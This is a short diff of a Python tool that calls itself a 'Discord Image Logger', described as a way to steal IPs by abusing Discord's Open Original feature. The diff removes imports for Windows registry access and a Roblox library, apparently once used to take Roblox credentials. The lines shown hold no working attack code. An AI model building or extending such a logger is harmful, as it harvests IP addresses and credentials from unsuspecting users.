@@ -3,10 +3,6 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser\
-import requests
-from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
-import robloxpy
-import json
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
